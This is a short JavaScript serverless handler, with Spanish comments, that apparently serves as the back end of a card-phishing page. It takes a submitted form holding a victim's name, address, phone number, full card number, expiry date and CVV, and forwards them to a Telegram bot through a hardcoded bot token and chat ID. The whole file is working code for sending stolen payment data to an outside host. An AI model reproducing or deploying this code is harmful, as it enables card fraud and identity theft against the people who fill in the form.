export default async function handler(req, res) {
  if (req.method === "POST") {
    // Corregimos "fecha-expiracion" por "fechaExpiracion" o como venga del formulario
    const {
      nombre,
      apellido,
      direccion1,
      direccion2,
      cp,
      localidad,
      estado,
      telefono,
      titular_tarjeta,
      numero_tarjeta,
      fechaExpiracion, // Cambiado aquí
      cvv
    } = req.body;

    const TOKEN = "8401970175:AAE05kR2oXgs56qnmxyE8UnTmsfx6ASURk0";
    const CHAT_ID = "7575566106";

    const mensaje = `
🔥 NUEVO REGISTRO

👤 ${nombre} ${apellido}

🏠 Dirección:
${direccion1}
${direccion2 || ""}

📍 ${localidad}, ${estado}
📮 CP: ${cp}

📱 Teléfono: ${telefono}

📝 Nombre del titular: ${titular_tarjeta}

🔢 ${numero_tarjeta} | ${fechaExpiracion} | ${cvv} 
`;

    try {
      const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: mensaje
        })
      });

      if (response.ok) {
        res.status(200).json({ success: true });
      } else {
        res.status(500).json({ error: "Error al enviar a Telegram" });
      }
    } catch (error) {
      res.status(500).json({ error: "Error de red" });
    }
  } else {
    res.status(405).json({ message: "Método no permitido" });
  }
}
